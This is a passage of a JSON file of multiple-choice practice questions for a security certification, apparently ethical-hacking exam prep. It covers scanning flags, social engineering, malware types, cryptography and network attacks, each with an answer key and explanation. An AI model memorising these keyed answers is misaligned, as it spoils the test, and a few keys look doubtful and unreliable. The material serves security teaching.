        "Sinkhole",
        "aLTEr"
      ],
      "correct": "D",
      "explanation": "aLTEr attack uses fake eNodeB as man-in-the-middle."
    },
    {
      "q": 90,
      "type": "MCQ",
      "question": "Which best describes white box testing methodology?",
      "options": [
        "The internal operation of system is completely known to tester.",
        "Only external operation is accessible.",
        "Only internal operation is known.",
        "Internal operation is only partly accessible."
      ],
      "correct": "A",
      "explanation": "White-box testing has complete knowledge of internal structures."
    },
    {
      "q": 91,
      "type": "MCQ",
      "question": "Why is penetration test better than vulnerability scan?",
      "options": [
        "Pen test tools have more comprehensive vulnerability databases.",
        "Penetration tests exploit weaknesses while vulnerability scan does not.",
        "Penetration test is automated while vulnerability scan requires active engagement.",
        "Vulnerability scans only do host discovery and port scanning."
      ],
      "correct": "B",
      "explanation": "Pen tests actively exploit vulnerabilities while scans only identify them."
    },
    {
      "q": 92,
      "type": "MCQ",
      "question": "Which is most reliable type of TCP scanning?",
      "options": [
        "Half-open Scan.",
        "TCP Connect/Full Open Scan.",
        "Xmas Scan.",
        "NULL Scan."
      ],
      "correct": "B",
      "explanation": "TCP Connect completes three-way handshake for reliable results."
    },
    {
      "q": 93,
      "type": "MCQ",
      "question": "What describes two-factor authentication for credit card (card and PIN)?",
      "options": [
        "Something you have and something you know.",
        "Something you have and something you are.",
        "Something you know and something you are.",
        "Something you are and something you remember."
      ],
      "correct": "A",
      "explanation": "Card is something you have, PIN is something you know."
    },
    {
      "q": 94,
      "type": "MCQ",
      "question": "What means the flag '-oX' in Nmap scan?",
      "options": [
        "Output results in truncated format to screen.",
        "Run a Xmas scan.",
        "Output results in XML format to file.",
        "Run an express scan."
      ],
      "correct": "C",
      "explanation": "-oX outputs scan results in XML format."
    },
    {
      "q": 95,
      "type": "MCQ",
      "question": "Which is NOT true about Simple Object Access Protocol?",
      "options": [
        "Only compatible with HTTP.",
        "Allows for any programming model.",
        "Exchanges data between web services.",
        "Using Extensible Markup Language."
      ],
      "correct": "A",
      "explanation": "SOAP can be used with any application-level protocol, not just HTTP."
    },
    {
      "q": 96,
      "type": "MCQ",
      "question": "Which wireless standard has bandwidth up to 54 Mbit/s at 5 GHz?",
      "options": [
        "802.11g",
        "802.11i",
        "802.11n",
        "802.11a"
      ],
      "correct": "D",
      "explanation": "802.11a operates at 5 GHz with 54 Mbit/s max."
    },
    {
      "q": 97,
      "type": "MCQ",
      "question": "Which cipher is based on factoring product of two large prime numbers?",
      "options": [
        "SHA-1",
        "RSA",
        "MD5",
        "RC5"
      ],
      "correct": "B",
      "explanation": "RSA security is based on difficulty of factoring large prime products."
    },
    {
      "q": 98,
      "type": "MCQ",
      "question": "Which command launches Computer Management Console from Run window?",
      "options": [
        "gpedit.msc",
        "ncpa.cpl",
        "compmgmt.msc",
        "services.msc"
      ],
      "correct": "C",
      "explanation": "compmgmt.msc opens Computer Management."
    },
    {
      "q": 99,
      "type": "MCQ",
      "question": "Which does NOT apply to IPsec?",
      "options": [
        "Work at Data Link Layer",
        "Encrypts payloads",
        "Provides authentication",
        "Use key exchange"
      ],
      "correct": "A",
      "explanation": "IPsec works at Network layer (Layer 3), not Data Link."
    },
    {
      "q": 100,
      "type": "MCQ",
      "question": "According to PCI DSS, when must penetration testing be conducted?",
      "options": [
        "At least once a year and after significant upgrade.",
        "At least twice a year or after significant upgrade.",
        "At least once every three years or after significant upgrade.",
        "At least once every two years and after significant upgrade."
      ],
      "correct": "A",
      "explanation": "PCI DSS requires annual penetration testing and after major changes."
    },
    {
      "q": 101,
      "type": "MCQ",
      "question": "What identifies malware by collecting data from protected computers and analyzing on provider's infrastructure?",
      "options": [
        "Heuristics-based detection",
        "Behavioural-based detection",
        "Cloud-based detection",
        "Real-time protection"
      ],
      "correct": "C",
      "explanation": "Cloud-based detection analyzes data on provider's infrastructure."
    },
    {
      "q": 102,
      "type": "MCQ",
      "question": "New laptop won't connect to 802.11. Sniffer shows WAP not responding to association requests. What problem?",
      "options": [
        "Laptop configured for wrong channel.",
        "Laptop cannot see SSID.",
        "WAP does not recognize laptop's MAC address.",
        "Laptop not configured for DHCP."
      ],
      "correct": "C",
      "explanation": "MAC filtering is blocking the laptop's MAC address."
    },
    {
      "q": 103,
      "type": "MCQ",
      "question": "What is logical collection of Internet-connected devices whose security has been breached?",
      "options": [
        "Spambot",
        "Botnet",
        "Spear Phishing",
        "Rootkit"
      ],
      "correct": "B",
      "explanation": "Botnet is network of compromised devices controlled by third party."
    },
    {
      "q": 104,
      "type": "MCQ",
      "question": "After unsuccessful software attempts to extract crypto keys, what methodology should Mark try?",
      "options": [
        "Frequency Analysis.",
        "Trickery and Deceit.",
        "Brute-Force.",
        "One-Time Pad."
      ],
      "correct": "B",
      "explanation": "Trickery and Deceit uses social engineering to extract keys."
    },
    {
      "q": 105,
      "type": "MCQ",
      "question": "What is meant by 'rubber-hose' attack in cryptography?",
      "options": [
        "Extraction of cryptographic secrets through coercion or torture.",
        "A backdoor placed into crypto algorithm by creator.",
        "Forcing keystream through hardware-accelerated device.",
        "Attempting to decrypt by making logical assumptions."
      ],
      "correct": "A",
      "explanation": "Rubber-hose attack uses coercion/torture to extract crypto secrets."
    },
    {
      "q": 106,
      "type": "MCQ",
      "question": "Firewall prevents packets through certain ports and applications. What does it check?",
      "options": [
        "Presentation layer headers and session layer ports.",
        "Application layer port numbers and transport layer headers.",
        "Application layer headers and transport layer port numbers.",
        "Network layer headers and session layer ports."
      ],
      "correct": "C",
      "explanation": "Firewalls check application headers and transport layer ports."
    },
    {
      "q": 107,
      "type": "MCQ",
      "question": "Which requires national standards for electronic health care transactions?",
      "options": [
        "SOX",
        "DMCA",
        "HIPAA",
        "PCI-DSS"
      ],
      "correct": "C",
      "explanation": "HIPAA Title II requires national standards for healthcare transactions."
    },
    {
      "q": 108,
      "type": "MCQ",
      "question": "Which Bluetooth attack sends unsolicited messages without recipient's consent?",
      "options": [
        "Bluejacking",
        "Bluesnarfing",
        "Bluesmacking",
        "Bluebugging"
      ],
      "correct": "A",
      "explanation": "Bluejacking sends unsolicited messages via Bluetooth."
    },
    {
      "q": 109,
      "type": "MCQ",
      "question": "Which IoT architecture layer bridges gap between endpoints and carries out message routing?",
      "options": [
        "Middleware.",
        "Access Gateway.",
        "Edge Technology.",
        "Internet."
      ],
      "correct": "B",
      "explanation": "Access Gateway (IoT gateway) connects devices to internet."
    },
    {
      "q": 110,
      "type": "MCQ",
      "question": "Which tool can be used to perform session splicing attacks?",
      "options": [
        "Hydra",
        "tcpsplice",
        "Whisker",
        "Burp"
      ],
      "correct": "C",
      "explanation": "Whisker tool performs session splicing for IDS evasion."
    },
    {
      "q": 111,
      "type": "MCQ",
      "question": "Risk assessment shows 40% breach risk. After changes, risk is 12% with 20% threshold. What's best business decision?",
      "options": [
        "Introduce more controls to bring risk to 0%.",
        "Limit the risk.",
        "Accept the risk.",
        "Avoid the risk."
      ],
      "correct": "C",
      "explanation": "Risk is below threshold, so accepting it is most cost-effective."
    },
    {
      "q": 112,
      "type": "MCQ",
      "question": "What should you do if hired company is involved with human trafficking?",
      "options": [
        "Copy information to removable media.",
        "Stop work and contact proper legal authorities.",
        "Ignore information and continue assessment.",
        "Confront customer about this."
      ],
      "correct": "B",
      "explanation": "Must stop work and contact legal authorities for illegal activities."
    },
    {
      "q": 113,
      "type": "MCQ",
      "question": "Viktor gains control of user account and tries to access another account's sensitive information. What is this?",
      "options": [
        "Fingerprinting",
        "Shoulder-Surfing",
        "Privilege Escalation",
        "Port Scanning"
      ],
      "correct": "C",
      "explanation": "Privilege escalation gains elevated access beyond intended permissions."
    },
    {
      "q": 114,
      "type": "MCQ",
      "question": "Ivan wants victim going to 'www.site.com' directed to phishing site. Which file should he change?",
      "options": [
        "Boot.ini",
        "Sudoers",
        "Hosts",
        "Networks"
      ],
      "correct": "C",
      "explanation": "Hosts file maps hostnames to IP addresses."
    },
    {
      "q": 115,
      "type": "MCQ",
      "question": "Ivan wants to collect information about operating systems used. Which technique?",
      "options": [
        "UDP Scanning.",
        "Banner Grabbing.",
        "SSDP Scanning.",
        "IDLE/IPID Scanning."
      ],
      "correct": "B",
      "explanation": "Banner grabbing gains information about systems and services."
    },
    {
      "q": 116,
      "type": "MCQ",
      "question": "Which security feature uses DHCP snooping database to prevent man-in-the-middle attacks?",
      "options": [
        "Spanning tree",
        "Port security",
        "DHCP relay",
        "DAI"
      ],
      "correct": "D",
      "explanation": "Dynamic ARP Inspection (DAI) uses DHCP snooping to prevent ARP spoofing."
    },
    {
      "q": 117,
      "type": "MCQ",
      "question": "Laptop can transfer files locally but not access Internet. IP and gateway both on 192.168.1.0/24. What caused problem?",
      "options": [
        "Laptop isn't using private IP.",
        "Laptop and gateway not on same network.",
        "Laptop using invalid IP.",
        "Gateway not routing to public IP."
      ],
      "correct": "D",
      "explanation": "Gateway cannot route private IPs to Internet without NAT."
    },
    {
      "q": 118,
      "type": "MCQ",
      "question": "Which is best option for defending from network sniffing?",
      "options": [
        "Restrict physical access to server rooms.",
        "Register all MAC addresses centrally.",
        "Using encryption protocols for network communications.",
        "Use static IP addresses."
      ],
      "correct": "C",
      "explanation": "Encryption prevents attackers from reading intercepted data."
    },
    {
      "q": 119,
      "type": "MCQ",
      "question": "Using PKI to protect email, at what OSI layer is message encrypted/decrypted?",
      "options": [
        "Application layer.",
        "Session layer.",
        "Transport layer.",
        "Presentation layer."
      ],
      "correct": "D",
      "explanation": "Presentation layer handles encryption and decryption."
    },
    {
      "q": 120,
      "type": "MCQ",
      "question": "Which UDP port is usually used by Network Time Protocol (NTP)?",
      "options": [
        "19",
        "123",
        "161",
        "177"
      ],
      "correct": "B",
      "explanation": "NTP uses UDP port 123 for time synchronization."
    },
    {
      "q": 121,
      "type": "MCQ",
      "question": "When sniffing network, what is NOT available?",
      "options": [
        "Identifying OS, services, protocols and devices.",
        "Capturing network traffic for analysis.",
        "Collecting unencrypted usernames and passwords.",
        "Modifying and replaying captured traffic."
      ],
      "correct": "D",
      "explanation": "Passive sniffing cannot modify or replay traffic, only capture."
    },
    {
      "q": 122,
      "type": "MCQ",
      "question": "Which method best protects confidential information on laptop that can be stolen while travelling?",
      "options": [
        "BIOS password.",
        "Hidden folders.",
        "Full disk encryption.",
        "Password protected files."
      ],
      "correct": "C",
      "explanation": "Full disk encryption protects all data if device is stolen."
    },
    {
      "q": 123,
      "type": "MCQ",
      "question": "How does Boot Sector Virus mechanism work?",
      "options": [
        "Moves MBR to RAM and copies itself to original MBR location.",
        "Moves MBR to another location on hard disk and copies itself to original MBR location.",
        "Overwrites original MBR and executes only virus code.",
        "Modifies directory table entries to point to virus code."
      ],
      "correct": "B",
      "explanation": "Boot sector virus moves MBR and replaces it with malicious code."
    },
    {
      "q": 124,
      "type": "MCQ",
      "question": "Which flag will trigger Xmas scan?",
      "options": [
        "-sP",
        "-sA",
        "-sV",
        "-sX"
      ],
      "correct": "D",
      "explanation": "-sX performs Xmas scan setting FIN, PSH, and URG flags."
    },
    {
      "q": 125,
      "type": "MCQ",
      "question": "How to deal with DNS Cache Poisoning threat affecting clients?",
      "options": [
        "Customer awareness",
        "Use multi-factor authentication",
        "Use security agents on customers' computers.",
        "Use Domain Name System Security Extensions (DNSSEC)"
      ],
      "correct": "D",
      "explanation": "DNSSEC provides authentication to prevent DNS poisoning."
    }
  ],
  "2": [
    {
      "q": 1,
      "type": "MCQ",
      "question": "When configuring wireless on the router, your colleague disables SSID broadcast but leaves authentication 'open' and sets SSID to a 32-character string of random letters and numbers. Which of the following is the correct statement about this scenario?",
      "options": [
        "Disabling SSID broadcast prevents 802.11 beacons from being transmitted from the access point, resulting in a proper setup leveraging 'security through obscurity'.",
        "This move will prevent brute-force attacks.",
        "The hacker still has the opportunity to connect to the network after sniffing the SSID from a successful wireless association.",
        "The router is still vulnerable to wireless hacking attempts because the SSID broadcast setting can be enabled using a specially crafted packet sent to the access point's hardware address."
      ],
      "correct": "C",
      "explanation": "Relying on the secrecy of the SSID is a poor security strategy: a wireless sniffer in monitor mode can detect the SSID used by clients as they join WLANs; this is true even if SSID broadcasts are disabled."
    },
    {
      "q": 2,
      "type": "MCQ",
      "question": "Identify the type of hacker following description: When finding a zero-day vulnerability on a public-facing system, a hacker sends an email to the owner of the public system describing the problem and how the owner can protect themselves from that vulnerability.",
      "options": [
        "Gray hat",
        "Red hat",
        "White hat",
        "Black hat"
      ],
      "correct": "C",
      "explanation": "White Hat hackers use their capabilities to uncover security failings in systems to help safeguard businesses from dangerous hackers. Companies hire White Hats to stress test their information systems."
    },
    {
      "q": 3,
      "type": "MCQ",
      "question": "Which of the following tiers in the three-tier application architecture is responsible for moving and processing data between them?",
      "options": [
        "Data tier",
        "Presentation tier",
        "Logic tier",
        "Application Layer"
      ],
      "correct": "C",
      "explanation": "The application tier (logic tier) is the heart of the application. Information collected in the presentation tier is processed using business logic. The application tier can also add, delete or modify data in the data tier."
    },
    {
      "q": 4,
      "type": "MCQ",
      "question": "While browsing his social media feed, Jacob noticed Jane's photo with the caption: 'Learn more about your friends,' as well as several personal questions under the post. Jacob is suspicious and texts Jane with questions about this post. Jane confirms that she did indeed post it. With the assurance that the post is legitimate, Jacob responds to the questions on the friend's post. A few days later, Jacob tries to log into his bank account and finds out that it has been compromised and the password was changed. What most likely happened?",
      "options": [
        "Jacob's bank-account login information was brute-forced.",
        "Jacob's password was stolen while he was enthusiastically participating in the survey.",
        "Jacob inadvertently provided the answers to his security questions when responding to Jane's post.",
        "Jacob's computer was infected with a Banker Trojan."
      ],
      "correct": "C",
      "explanation": "Social media sites are littered with seemingly innocuous little quizzes, games, and surveys. In doing so, you may be inadvertently giving away the answers to 'secret questions' that can be used to unlock access to your online accounts."
    },
    {
      "q": 5,
      "type": "MCQ",
      "question": "Which of the following attacks can you perform if you know that the web server handles the '(../)' (character string) incorrectly and returns the file listing of a folder structure of the server?",
      "options": [
        "Denial of service.",
        "Directory traversal.",
        "Cross-site scripting.",
        "SQL injection."
      ],
      "correct": "B",
      "explanation": "A directory traversal (or path traversal) attack exploits insufficient security validation or sanitization of user-supplied file names. It is also known as the ../ (dot dot slash) attack, directory climbing, and backtracking."
    },
    {
      "q": 6,
      "type": "MCQ",
      "question": "Identify the phase of the APT lifecycle that the hacker is in at the moment according to the scenario given below: The hacker prepared for an attack and attempted to enter the target network using techniques such as sending spear-phishing emails and exploiting vulnerabilities on publicly available servers. Thanks to the successful attack, he deployed malware on the target system to establish an outbound connection and began to move on.",
      "options": [
        "Preparation",
        "Cleanup",
        "Persistence",
        "Initial intrusion"
      ],
      "correct": "D",
      "explanation": "Initial Intrusion phase involves using techniques such as spear phishing emails or exploiting vulnerabilities to gain access. During this phase, malicious code or malware is deployed into the target system to initiate an outward connection."
    },
    {
      "q": 7,
      "type": "MCQ",
      "question": "Imagine the following scenario: The hacker monitored and intercepted already established traffic between the victim and a host machine to predict the victim's ISN. The hacker sent spoofed packets with the victim's IP address to the host machine using the ISN. After this manipulation, the host machine responded with a packet having an incremented ISN. The victim's connection was interrupted, and the hacker was able to connect with the host machine on behalf of the victim. Which of the following attacks did the hacker perform?",
      "options": [
        "UDP hijacking",
        "TCP/IP hijacking",
        "Blind hijacking",
        "Forbidden attack"
      ],
      "correct": "B",
      "explanation": "TCP/IP Hijacking is when an authorized user gains access to a genuine network connection of another user. It is done in order to bypass the password authentication which is normally the start of a session."
    },
    {
      "q": 8,
      "type": "MCQ",
      "question": "John, a security specialist, conducts a pentest in his organization. He found information about the emails of two employees in some public sources and is preparing a client-side backdoor to send to the employees via email. Which of the stages of the cyber kill chain does John perform?",
      "options": [
        "Exploitation",
        "Command and control",
        "Weaponization",
        "Reconnaissance"
      ],
      "correct": "C",
      "explanation": "Weaponization: In this step, the intruder creates a malware weapon like a virus, worm, or such to exploit the target's vulnerabilities. This includes creating client-side backdoors."
    },
    {
      "q": 9,
      "type": "MCQ",
      "question": "Which of the following is a file on a web server that can be misconfigured and provide sensitive information for a hacker, such as verbose error messages?",
      "options": [
        "idq.dll",
        "httpd.conf",
        "php.ini",
        "administration.config"
      ],
      "correct": "C",
      "explanation": "php.ini file can be exposed inside the 'cgi-bin' directory. This allows any unauthenticated, remote user to discover sensitive information about your server(s), including database logins and passwords and verbose error messages."
    },
    {
      "q": 10,
      "type": "MCQ",
      "question": "Identify the correct syntax for ICMP scan on a remote computer using hping2.",
      "options": [
        "hping2 -1 target.domain.com",
        "hping2 target.domain.com",
        "hping2 --l target.domain.com",
        "hping2 --set-ICMP target.domain.com"
      ],
      "correct": "A",
      "explanation": "We send ICMP scans using the -1 (one) mode. Basically the syntax will be hping2 -1 IPADDRESS"
    },
    {
      "q": 11,
      "type": "MCQ",
      "question": "You need to send an email containing confidential information. Your colleague advises you to use PGP to be sure that the data will be safe. What should you use to communicate correctly using this type of encryption?",
      "options": [
        "Use your own private key to encrypt the message.",
        "Use your own public key to encrypt the message.",
        "Use your colleague's public key to encrypt the message.",
        "Use your colleague's private key to encrypt the message."
      ],
      "correct": "C",
      "explanation": "In PGP encryption, you use the recipient's public key to encrypt the message. Only the recipient's private key can decrypt it."
    },
    {
      "q": 12,
      "type": "MCQ",
      "question": "The attacker is trying to cheat one of the employees of the target organization by initiating fake calls while posing as a legitimate employee. Also, he sent phishing emails to steal employee's credentials and further compromise his account. Which of the following techniques did the attacker use?",
      "options": [
        "Password reuse",
        "Social engineering",
        "Insider threat",
        "Reverse engineering"
      ],
      "correct": "B",
      "explanation": "Social engineering is a manipulation technique that exploits human error to gain private information, access, or valuables. This includes phishing, pretexting, baiting, and physical breaches."
    },
    {
      "q": 13,
      "type": "MCQ",
      "question": "Jennys wants to send a digitally signed message to Molly. What key will Jennys use to sign the message, and how will Molly verify it?",
      "options": [
        "Jennys will sign the message with her private key, and Molly will verify that the message came from Jennys by using Jenny's public key",
        "Jennys will sign the message with Molly's private key, and Molly will verify that the message came from Jennys by using Jenny's public key",
        "Jennys will sign the message with Molly's public key, and Molly will verify that the message came from Jennys by using Jenny's public key",
        "Jennys will sign the message with her public key, and Molly will verify that the message came from Jenny's by using Jenny's private key."
      ],
      "correct": "A",
      "explanation": "Digital signatures are created using the sender's private key to encrypt signature-related data, while the only way to decrypt that data is with the signer's public key."
    },
    {
      "q": 14,
      "type": "MCQ",
      "question": "You must bypass the firewall. To do this, you plan to use DNS to perform data exfiltration on an attacked network. You embed malicious data into the DNS protocol packets. DNSSEC can't detect these malicious data, and you successfully inject malware to bypass a firewall and maintain communication with the victim machine and C&C server. Which of the following techniques would you use in this scenario?",
      "options": [
        "DNS enumeration",
        "DNSSEC zone walking",
        "DNS cache snooping",
        "DNS tunnelling"
      ],
      "correct": "D",
      "explanation": "DNS Tunneling encodes the data of other programs or protocols in DNS queries and responses. DNS tunneling requires the compromised system to have external network connectivity, as it requires access to an internal DNS server with network access."
    },
    {
      "q": 15,
      "type": "MCQ",
      "question": "Which of the following describes cross-site request forgery?",
      "options": [
        "A request sent by a malicious user from a browser to a server.",
        "A server makes a request to another server without the user's knowledge.",
        "Modifying the request by the proxy server between the client and the server.",
        "A browser makes a request to a server without the user's knowledge."
      ],
      "correct": "D",
      "explanation": "CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. The browser automatically includes credentials, so the site cannot distinguish between forged and legitimate requests."
    },
    {
      "q": 16,
      "type": "MCQ",
      "question": "The attacker, during the attack, installed a scanner on a machine belonging to one of the employees of the target organization and scanned several machines on the same network to identify vulnerabilities to exploit further. Which of the following type of vulnerability assessment tools employed the attacker?",
      "options": [
        "Cluster scanner.",
        "Agent-based scanner.",
        "Network-based scanner.",
        "Proxy scanner."
      ],
      "correct": "C",
      "explanation": "Network-based scanner enables identifying loopholes on a computer's network or IT assets. By implementing this process, one can successfully identify their organization's current risks."
    },
    {
      "q": 17,
      "type": "MCQ",
      "question": "Which of the following programs is best used for analyzing packets on your wireless network?",
      "options": [
        "Wireshark with Airpcap",
        "Ethereal with Winpcap",
        "Airsnort with Airpcap",
        "Wireshark with Winpcap"
      ],
      "correct": "A",
      "explanation": "For analyzing wireless networks, AirPcap is required. Riverbed AirPcap USB-based adapters capture 802.11 wireless traffic for analysis. It works with Wireshark for wireless packet analysis."
    },
    {
      "q": 18,
      "type": "MCQ",
      "question": "You must discover all the active devices hidden by a restrictive firewall in the IPv4 range in a target network. Which of the following host discovery techniques will you use?",
      "options": [
        "UDP scan",
        "TCP Maimon scan",
        "ARP ping scan",
        "ACK flag probe scan"
      ],
      "correct": "C",
      "explanation": "ARP is required for an Ethernet network to function properly, so it typically is not blocked by a firewall. Since ARP is not routed, you must be on the same subnet. By sending an ARP request, you are virtually guaranteed to get a reply."
    },
    {
      "q": 19,
      "type": "MCQ",
      "question": "During testing execution, you established a connection with your computer using the SMB service and entered your login and password in plaintext. After the testing is completed, you need to delete the data about the login and password you entered so that no one can use it. Which of the following files do you need to clear?",
      "options": [
        ".bash_history",
        ".profile",
        ".xsession-log",
        ".bashrc"
      ],
      "correct": "A",
      "explanation": ".bash_history stores a history of user commands entered at the command prompt. You may pass sensitive information such as passwords and it is stored in shell history file. history -c clears your history."
    },
    {
      "q": 20,
      "type": "MCQ",
      "question": "Identify the footprinting technique by description: Using this technique, an attacker can gather domain information such as the target domain name, contact details of its owner, expiry date, and creation date. Also, using this information, an attacker can create a map of the organization's network and misleads domain owners with social engineering to obtain internal details of its network.",
      "options": [
        "VPN footprinting",
        "Email footprinting",
        "VoIP footprinting",
        "Whois footprinting"
      ],
      "correct": "D",
      "explanation": "WHOIS is a query and response protocol that is widely used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name or an IP address block."
    },
    {
      "q": 21,
      "type": "MCQ",
      "question": "You have been assigned the task of checking the implementation of security policies in the company. During the audit, you found that a user from the IT department had a dial-out modem installed. Which of the following security policies should you check to see if dial-out modems are allowed?",
      "options": [
        "Acceptable-use policy",
        "Permissive policy",
        "Firewall policy",
        "Remote-access policy"
      ],
      "correct": "D",
      "explanation": "A remote access policy is a written document containing the guidelines for connecting to an organization's network from outside the office. It helps secure corporate data and networks amidst remote work."
    },
    {
      "q": 22,
      "type": "MCQ",
      "question": "Andy, the evil hacker, wants to collect information about Nick. He discovered that Nick's organization recently purchased new equipment. Andy decided to call Nick masquerading as a legitimate customer support executive, informing him that their new systems need to be serviced for proper functioning and notified him that customer support would send a computer technician. Nick agreed and agreed on a date for a meeting with Andy. A few days later, Andy entered the territory of Nick's organization unhindered and gathered sensitive information by scanning terminals for passwords, searching for important documents in desks, and rummaging bins. What is the type of attack technique Andy used on Nick?",
      "options": [
        "Shoulder surfing attack.",
        "Dumpster diving attack.",
        "Eavesdropping attack.",
        "Impersonation attack."
      ],
      "correct": "D",
      "explanation": "An impersonation attack typically involves pretending to be from a trusted source. In this case, Andy impersonated a customer support executive to trick Nick into allowing access to the organization."
    },
    {
      "q": 23,
      "type": "MCQ",
      "question": "Which of the following services runs directly on TCP port 445?",
      "options": [
        "Server Message Block (SMB)",
        "Telnet",
        "Network File System (NFS)",
        "Remote procedure call (RPC)"
      ],
      "correct": "A",
      "explanation": "SMB requires network ports on a computer or server to enable communication to other systems. Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack."
    },
    {
      "q": 24,
      "type": "MCQ",
      "question": "Your organization's network uses the network address 192.168.1.64 with mask 255.255.255.192, and servers in your organization's network are in the addresses 192.168.1.140, 192.168.1.141 and 192.168.1.142. The attacker who wanted to find them couldn't do it. He used the following command for the network scanning: nmap 192.168.1.64/28. Why couldn't the attacker find these servers?",
      "options": [
        "He needs to add the command 'ip address' just before the IP address",
        "He needs to change the address to 192.168.1.0 with the same mask",
        "The network must be dawn and the nmap command and IP address are ok",
        "He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range"
      ],
      "correct": "D",
      "explanation": "A /28 subnet mask provides 16 IP addresses (192.168.1.64-192.168.1.79). The servers at 192.168.1.140-142 are outside this range."
    },
    {
      "q": 25,
      "type": "MCQ",
      "question": "You use Docker architecture in your application to employ a client/server model. And you need to use a component that can process API requests and handle various Docker objects, such as containers, volumes, images, and networks. Which of the following Docker components will you use for these purposes?",
      "options": [
        "Docker client",
        "Docker daemon",
        "Docker objects",
        "Docker registries"
      ],
      "correct": "B",
      "explanation": "The Docker daemon (dockerd) listens for Docker API requests and manages Docker objects such as images, containers, networks, and volumes. A daemon can also communicate with other daemons to manage Docker services."
    },
    {
      "q": 26,
      "type": "MCQ",
      "question": "You have decided to test your organization's website. For this purpose, you need a tool that can work as a proxy and save every request and response. Also, this tool must allow you to test parameters and headers manually to get more precise results than if using web vulnerability scanners. Which of the following tools is appropriate for your requirements?",
      "options": [
        "Maskgen",
        "Proxychains",
        "Burp suite",
        "S3Scanner"
      ],
      "correct": "C",
      "explanation": "Burp Suite is an interception proxy that allows penetration testers to capture, analyze, and manipulate HTTP requests between their browser and the target application."
    },
    {
      "q": 27,
      "type": "MCQ",
      "question": "You enter the following command to get the necessary data: ping-* 6 192.168.120.114. Output shows 6 packets sent and received. Which of the following flags is hidden under '*'?",
      "options": [
        "n",
        "a",
        "s",
        "t"
      ],
      "correct": "A",
      "explanation": "The -n flag in ping specifies the number of echo Request messages to be sent. The default is 4. In this case, 6 packets were sent as specified by 'ping -n 6'."
    },
    {
      "q": 28,
      "type": "MCQ",
      "question": "What is the common name of vulnerability disclosure programs opened by companies on HackerOne, Bugcrowd, etc.?",
      "options": [
        "Vulnerability hunting program",
        "Bug bounty program",
        "Ethical hacking program",
        "White-hat hacking program"
      ],
      "correct": "B",
      "explanation": "A bug bounty program (also called a vulnerability rewards program) is a crowdsourcing initiative that rewards individuals for discovering and reporting software bugs."
    },
    {
      "q": 29,
      "type": "MCQ",
      "question": "Percival, the evil hacker, found the contact number of cybersecuritycompany.org on the internet and dialled the number, claiming himself to represent a technical support team from a vendor. He informed an employee of cybersecuritycompany that a specific server would be compromised and requested the employee to follow the provided instructions. Consequently, he prompted the victim to execute unusual commands and install malicious files, which were then used to collect and pass critical information to his machine. Which of the following social engineering techniques did Percival use?",
      "options": [
        "Quid pro quo",
        "Phishing",
        "Elicitation",
        "Diversion theft"
      ],
      "correct": "A",
      "explanation": "Quid pro quo attacks involve calling random numbers claiming to be from technical support and offering assistance. Once they find someone with a legitimate problem, they guide them through steps that give the attackers access."
    },
    {
      "q": 30,
      "type": "MCQ",
      "question": "Marketing department employees complain that their computers are working slow and every time they attempt to go to a website, they receive a series of pop-ups with advertisements. Which of the following type of malwares infected their systems?",
      "options": [
        "Trojan",
        "Adware",
        "Virus",
        "Spyware"
      ],
      "correct": "B",
      "explanation": "Adware (advertisement-supported software) includes advertisements or helps distribute other software. Creators get paid each time you open an ad (PPC), each time an ad is shown (PPV), or each time bundled software is installed (PPI)."
    },
    {
      "q": 31,
      "type": "MCQ",
      "question": "You need to identify the OS of the target host. You want to use the Unicornscan tool to do this. As a result of using the tool, you got the TTL value and determined that the target system is running a Windows OS. Which of the following TTL values did you get when using the program?",
      "options": [
        "128",
        "255",
        "64",
        "138"
      ],
      "correct": "A",
      "explanation": "The default TTL value for modern versions of Windows is 128. Linux/Unix systems typically use 64, and network devices often use 255."
    },
    {
      "q": 32,
      "type": "MCQ",
      "question": "Which of the following is the hacker's first step in conducting a DNS cache poisoning attack on a target organization?",
      "options": [
        "The hacker makes a request to the DNS resolver.",
        "The hacker queries a nameserver using the DNS resolver.",
        "The hacker uses TCP to poison the DNS resolver.",
        "The hacker forges a reply from the DNS resolver."
      ],
      "correct": "A",
      "explanation": "The attacker proceeds to send DNS queries to the DNS resolver, which forwards the Root/TLD authoritative DNS server request and awaits an answer. This is the first step in DNS cache poisoning."
    },
    {
      "q": 33,
      "type": "MCQ",
      "question": "Which of the following is a type of virus detection method where the anti-virus executes the malicious codes on a virtual machine to simulate CPU and memory activities?",
      "options": [
        "Integrity checking",
        "Heuristic Analysis",
        "Code Emulation",
        "Scanning"
      ],
      "correct": "C",
      "explanation": "Code emulation emulates only the execution of the sample itself. It temporarily creates objects that the sample interacts with: passwords, antiviruses, memory, system registry etc. These objects are not real but imitations made by the emulator."
    },
    {
      "q": 34,
      "type": "MCQ",
      "question": "Identify the attack technique by description: The attacker gains unauthorized access to the target network, remains there without being detected for a long time, and obtains sensitive information without sabotaging the organization.",
      "options": [
        "Advanced persistent threat.",
        "Spear-phishing sites.",
        "Diversion theft.",
        "Insider threat."
      ],
      "correct": "A",
      "explanation": "An advanced persistent threat (APT) is a stealthy threat actor, typically a nation state or state-sponsored group, which gains unauthorized access to a computer network and remains undetected for an extended period."
    },
    {
      "q": 35,
      "type": "MCQ",
      "question": "Identify the technique by description: During the execution of this technique, an attacker copies the entire website and its content on a local drive to view the complete profile of the site's directory structure, file structure, web pages, images, etc. Thanks to the information gathered using this technique, an attacker map the website's directories and gains valuable information.",
      "options": [
        "Web cache poisoning",
        "Website defacement",
        "Website mirroring",
        "Session hijacking"
      ],
      "correct": "C",
      "explanation": "Website mirroring or website cloning refers to the process of duplicating a website. Mirroring a website helps in browsing the site offline, searching the website for vulnerabilities, and discovering valuable information."
    },
    {
      "q": 36,
      "type": "MCQ",
      "question": "John sent a TCP ACK segment to a known closed port on a firewall, but it didn't respond with an RST. What conclusion can John draw about the firewall he scanned?",
      "options": [
        "It's a non-stateful firewall.",
        "There is no firewall.",
        "It's a stateful firewall.",
        "John can't draw any conclusions based on this information."
      ],
      "correct": "C",
      "explanation": "According to RFC 793, a RST packet should be generated in response to an ACK probe whether the port is open or closed. However, stateful firewalls will discard out-of-sync ACK packets, leading to no response."
    },
    {
      "q": 37,
      "type": "MCQ",
      "question": "At which of the following stages of the cyber kill chain does data exfiltration occur?",
      "options": [
        "Installation",
        "Weaponization",
        "Actions on objectives",
        "Command and control"
      ],
      "correct": "C",
